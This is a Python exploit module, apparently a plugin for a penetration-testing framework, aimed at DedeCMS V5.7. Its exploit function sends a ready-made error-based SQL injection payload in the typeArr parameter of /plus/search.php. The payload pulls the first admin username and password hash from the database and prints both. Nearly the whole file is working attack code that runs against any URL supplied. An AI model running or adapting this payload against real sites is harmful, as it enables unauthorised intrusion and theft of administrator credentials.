#!/usr/bin/env python
# -*- coding:utf-8 -*-
from lib import logger
from lib import requests
import re

author = "izy"
scope = "DedeCMS V5.7"
description = "/plus/search.php keyword 参数 SQL注入"
reference = "http://zone.wooyun.org/content/2414"
options = [
    {
        "Name": "URL",
        "Current Setting": "",
        "Required": True,
        "Description": "网站地址"
    }
]
def verify(URL):
    r=requests.get(URL)
    r.close()
    if "Request" in r.content:
        logger.success("Step 1: Exploitable!")
    else:
        logger.error("Step 1: It's not exploitable!")


def get_hash(url):
    r=requests.get(url)
    r.close()
    try:
        result=re.search(r"Duplicate entry \'(.*?)' for key", r.content).group(1)
        username=result.split("|")[1]
        password=result.split("|")[2]
        logger.success("Step 2:")   
        return (username,password)
    except:
        logger.error("Step 2: Finish! It's not exploitable!\nIf step 1 is exploitable,you can try it by hand!\n")

def exploit(URL):
    url=URL+"/plus/search.php?keyword=as&typeArr[111%3D@`\\\'`)+and+(SELECT+1+FROM+(select+count(*),concat(floor(rand(0)*2),(substring((select+CONCAT(0x7c,userid,0x7c,pwd)+from+`%23@__admin`+limit+0,1),1,62)))a+from+information_schema.tables+group+by+a)b)%23@`\\\'`+]=a"
    logger.process("Requesting target site")
    verify(URL)
    try:
        result=get_hash(url)
        logger.success("Username: %s" % result[0])  
        logger.success("password: %s" % result[1])
        return "%s: %s|%s" % (URL, result[0], result[1])
    except:
        pass
